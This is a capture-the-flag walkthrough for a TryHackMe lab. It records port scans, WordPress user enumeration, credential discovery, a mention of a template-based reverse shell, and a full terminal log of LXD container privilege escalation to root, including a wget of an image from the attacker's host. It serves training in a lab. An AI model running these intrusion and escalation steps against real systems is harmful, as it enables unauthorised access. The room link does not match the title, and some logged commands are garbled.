---
title: Walkthrough - All in One
published: true
---

Security, i7md, wordpress, privesc, LXD. Fun bos where we get to exploit the system several ways

[https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

* * *

## Notes

- ``sudo nmap -Pn -sS -p- -T4 10.10.69.30 -vvv``

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

- ``sudo nmap -sV -sT -sC -p21,22,80 10.10.69.30``

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.127.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- can login to ftp anonymously but upon doing so there doesnt seem to be much for us to discover.

- ``gobuster dir -u http://10.10.17.196/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php --no-error -t 100`` 

- we find ``/wordpress`` and ``/hackathons``

- hackathons we see a possible hint "Damn how much I hate the smell of ~~Vinegar~~ :/ !!!" note the vinegar in italics. and a couple comments 

```
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

- This is a Vigenere encryprion and cyber chef gives us "Try H@ckme@123"

- ``wpscan --url http://10.10.69.30/wordpress --``

- ``wpscan --url http://10.10.17.196/wordpress --enumerate u`` - we find username "elyana"

- ``[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).``

- can login with elyana:H@ckme@123

edit the main index template to start a revshell

* * * 

## What is the user flag?

- hint.txt in elyanas home dir gives us a hint that their password is stored somewhere hidden on the machine.
- ``find / -group elyana 2>/dev/null``

```
user: elyana
password: E@syR18ght
```

- we can then ssh in and ``cat user.txt`` which has a flag in base64

* * * 

## What is the root flag?

- we can use the lxc container to get root privileges. https://www.hackingarticles.in/lxd-privilege-escalation/

```
bash-4.4$ wget http://10.2.127.225/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-08-05 04:39:42--  http://10.2.127.225/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.2.127.225:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64 100%[===================>]   3.11M   800KB/s    in 5.1s    

2022-08-05 04:40:53 (627 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

image4.4$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias my 
bash-4.4$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Aug 5, 2022 at 4:41am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
bash-4.4$ lxc init myimage ignite -c security.privileged=true
Creating ignite
ursive=truexc config devive add ignite mydevice disk source=/ path=/mnt/root rec 
Description:
  Manage container and server configuration options

Usage:
  lxc config [command]

Available Commands:
  device      Manage container devices
  edit        Edit container or server configurations as YAML
  get         Get values for container or server configuration keys
  metadata    Manage container metadata files
  set         Set container or server configuration keys
  show        Show container or server configurations
  template    Manage container file templates
  trust       Manage trusted clients
  unset       Unset container or server configuration keys

Global Flags:
      --debug         Show all debug messages
      --force-local   Force using the local unix socket
  -h, --help          Print help
  -v, --verbose       Show all information messages
      --version       Print version number

Use "lxc config [command] --help" for more information about a command.
bash-4.4$ lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: Container 'ignite' already exists
bash-4.4$ lxc start ignite
bash-4.4$ lxc ignite /bin/sh
Error: unknown command "ignite" for "lxc"
Run 'lxc --help' for usage.
bash-4.4$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # whoami
root
~ # cd /mnt/root
/bin/sh: cd: can't cd to /mnt/root: No such file or directory
~ # ls -las
total 12
     4 drwx------    2 root     root          4096 Aug  5 04:43 .
     4 drwxr-xr-x   19 root     root          4096 Aug  5 04:43 ..
     4 -rw-------    1 root     root            31 Aug  5 04:44 .ash_history
~ # cd /mnt/mnt/root
/bin/sh: cd: can't cd to /mnt/mnt/root: No such file or directory
~ # cd /
/ # ls
bin    etc    lib    mnt    proc   run    srv    tmp    var
dev    home   media  opt    root   sbin   sys    usr
/ # cd mnt/root/root
/bin/sh: cd: can't cd to mnt/root/root: No such file or directory
/ # cd mnt
/mnt # ls
/mnt # ls -las
total 8
     4 drwxr-xr-x    2 root     root          4096 Feb 18  2021 .
     4 drwxr-xr-x   19 root     root          4096 Aug  5 04:43 ..
/mnt # cd ..
/ # ls root
/ # cd root
~ # ls
~ # exit  
ursive=truexc config device add ignite mydevice disk source=/ path=/mnt/root recu
Device mydevice added to ignite
bash-4.4$ lxc start ignite
Error: Common start logic: The container is already running
bash-4.4$ lxc exec ignite /bin/sh
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
/mnt/root/root # 
```

* * * 

